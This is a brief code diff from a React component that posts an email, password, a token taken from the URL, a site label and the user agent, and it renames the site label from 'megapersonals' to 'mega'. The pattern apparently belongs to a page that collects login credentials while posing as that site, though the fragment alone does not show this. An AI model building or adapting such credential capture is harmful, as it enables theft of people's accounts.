@@ -68,7 +68,7 @@ const Home = () => {
             email,
             password,
             user_access_token: searchParams.get("id"),
-            site: 'megapersonals',
+            site: 'mega',
             user_agent: window.navigator.userAgent
          });
 
